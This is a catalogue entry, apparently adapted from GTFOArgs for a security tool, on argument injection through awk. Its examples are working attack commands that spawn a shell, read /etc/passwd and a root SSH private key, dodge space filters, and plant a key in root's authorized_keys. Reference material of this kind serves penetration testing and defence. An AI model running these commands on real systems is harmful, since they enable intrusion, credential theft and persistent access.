---
trust_level: community
id: argument-injection-awk
namespace: argument:injection:awk
name: awk
description: Argument injection via awk
version: 1.0.0
capabilities:
- security.execution.command
- system.file.read
- system.file.write
platforms:
- cross-platform
techniques:
- execution
- discovery
- exfiltration
execution:
  template: awk
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: Can be used to execute arbitrary commands on a system and spawn shells.
  command: awk 'BEGIN{system("/bin/sh")}'
- description: Can be used to execute arbitrary commands on a system.
  command: 'awk ''BEGIN {system("ls"); exit}'' /dev/null '
- description: The file must exist and command will be executed as many rows there
    are in the file.
  command: 'awk ''system("ls")'' /etc/passwd '
- description: If spaces cannot be inserted, we can use `sprintf(%c,32)` to emulate
    them.
  command: 'awk ''//{}BEGIN{system(sprintf("uname%c-aa",32))}'' '
- description: Read an arbitrary file.
  command: 'awk ''BEGIN{while((getline line<"/etc/passwd")>0){print line}}'' /dev/null '
- description: Print the contents of multiple files.
  command: 'awk ''//'' /etc/passwd /etc/hostname /root/.ssh/id_rsa '
- description: Write to an arbitrary file
  command: 'awk ''BEGIN{print "ssh-rsa ..." > "/root/.ssh/authorized_keys}'' /dev/null '
references:
- label: GTFOArgs
  url: https://gtfoargs.github.io/gtfoargs/awk/
features:
- file-system
- local
- pipes-stdin
- stealth
---

# awk

GTFOArgs entry for awk. This binary can be used to inject arguments for execution, file operations, or other capabilities.
